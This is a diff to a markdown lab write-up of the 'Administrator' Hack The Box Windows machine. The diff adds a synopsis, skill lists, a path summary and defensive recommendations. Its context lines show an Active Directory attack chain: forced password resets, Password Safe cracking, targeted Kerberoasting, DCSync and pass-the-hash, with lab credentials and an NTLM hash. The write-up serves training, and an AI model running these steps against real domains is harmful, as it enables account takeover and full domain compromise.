@@ -2,15 +2,36 @@
 
 **IP Address:** `10.10.11.42`  
 **OS:** Windows  
-**Difficulty:** Hard  
-**Tags:** #SMB, #WinRM, #BloodHound, #ShadowCredentials, #RPC, #PasswordCracking, #DCSync, #Kerberoast
+**Difficulty:** Medium  
+**Tags:** #SMB, #WinRM, #BloodHound, #RPC, #PasswordCracking, #DCSync, #Kerberoast, #ForceChangePassword, #PasswordSafe
 
 **Extra initial information:**
 - User: olivia
 - Password: ichliebedich
 
 ---
+## Synopsis
 
+Administrator is a medium Windows machine centered on Active Directory lateral movement and privilege escalation.  
+Starting with provided credentials for a low-privilege user, the attack chain involves enumerating domain relationships with **BloodHound**, abusing **GenericAll** permissions to force password resets across multiple accounts, recovering credentials from a **Password Safe** database found on FTP, performing a **targeted Kerberoast** attack, and culminating in a **DCSync** attack to dump the Domain Administrator hash.
+
+---
+## Skills Required
+
+- Active Directory enumeration and BloodHound analysis  
+- Familiarity with SMB, WinRM, RPC, and LDAP  
+- Password cracking with John the Ripper  
+- Understanding of Kerberos delegation and service tickets
+
+## Skills Learned
+
+- Lateral movement via ForceChangePassword abuse (GenericAll)  
+- BloodHound-driven attack path discovery  
+- Cracking Password Safe (`.psafe3`) databases  
+- Targeted Kerberoasting with custom tooling  
+- DCSync attack for full domain compromise
+
+---
 ## 1. Initial Enumeration
 
 ### 1.1 Host Discovery
@@ -22,7 +43,6 @@ ping 10.10.11.42
 ✅ Host is alive.
 
 ---
-
 ### 1.2 Port Scanning
 
 Initial full TCP port scan:
@@ -40,7 +60,6 @@ nmap -p21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,4966
 Exported results to XML for later web-based analysis — a technique I hadn’t used before and found helpful for clarity.
 
 ---
-
 ## 2. SMB and WinRM Access
 
 Started with classic enumeration via CrackMapExec:
@@ -82,7 +101,6 @@ evil-winrm -i 10.10.11.42 -u olivia -p 'ichliebedich'
 ```
 
 ---
-
 ## 3. User Enumeration and RPC Abuse
 
 Inside the WinRM shell, listed domain users:
@@ -127,7 +145,6 @@ GetNPUsers.py -no-pass -usersfile users.txt administrator.htb/
 Tried again with valid Olivia credentials → still no success.
 
 ---
-
 ## 4. LDAP and BloodHound Enumeration
 
 While waiting for BloodHound setup, dumped LDAP data:
@@ -167,7 +184,6 @@ bloodhound-python -u 'olivia' -p 'ichliebedich' -c All --zip -ns 10.10.11.42 -d 
 Visualized paths → `olivia` has **GenericAll** on `michael`.
 
 ---
-
 ## 5. Lateral Movement to `michael`
 
 Used password reset attack (ForceChangePassword) recommended by BloodHound:
@@ -192,7 +208,6 @@ net rpc password "benjamin" "newP@ssword2022" -U "administrator.htb"/"michael"%"
     
 
 ---
-
 ## 6. Access via SMB and FTP
 
 Used `smbmap` for recursive file listing:
@@ -210,7 +225,6 @@ ftp 10.10.11.42
 ✅ Found and downloaded `Backup.psafe3`.
 
 ---
-
 ## 7. Cracking the Password Safe
 
 Identified file as Password Safe DB. Used CLI utility:
@@ -232,7 +246,6 @@ john hash --wordlist=/usr/share/wordlists/rockyou.txt
 Accessed safe and recovered passwords of 3 users. Most interesting: `emily`.
 
 ---
-
 ## 8. PrivEsc with `emily` via Kerberoasting
 
 Logged in with Evil-WinRM as `emily`:
@@ -258,7 +271,6 @@ john hash_ethan --wordlist=/usr/share/wordlists/rockyou.txt
 ✅ Password: `limpbizkit`
 
 ---
-
 ## 9. DCSync Attack as Domain Admin
 
 BloodHound → `ethan` can perform DCSync.
@@ -280,5 +292,25 @@ evil-winrm -i 10.10.11.42 -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
 🏁 Root shell obtained.
 
 ---
-
 # ✅ MACHINE COMPLETE
+
+---
+## Summary of Exploitation Path
+
+1. **Provided credentials** → WinRM access as `olivia`.
+2. **BloodHound** → Identified `olivia` has **GenericAll** over `michael`.
+3. **ForceChangePassword** → Reset `michael`'s password, then `benjamin`'s.
+4. **FTP access** → Downloaded `Backup.psafe3` as `benjamin`.
+5. **Password Safe cracking** → Recovered `emily`'s credentials.
+6. **Targeted Kerberoast** → Cracked `ethan`'s TGS hash.
+7. **DCSync** → Dumped `Administrator` NTLM hash and obtained root shell.
+
+---
+## Defensive Recommendations
+
+- **Audit ACL permissions** in Active Directory to remove unnecessary GenericAll, GenericWrite, and ForceChangePassword rights between user accounts.
+- **Monitor password reset events** (Event ID 4724) for anomalous patterns, especially resets performed by non-admin accounts.
+- **Restrict FTP access** and avoid storing password databases on shared services.
+- **Use strong master passwords** for password managers; `tekieromucho` is trivially crackable.
+- **Limit DCSync-capable accounts** strictly to Domain Controllers and monitor for replication requests from non-DC sources (Event ID 4662).
+- **Implement tiered administration** to prevent lateral movement chains across privilege boundaries.
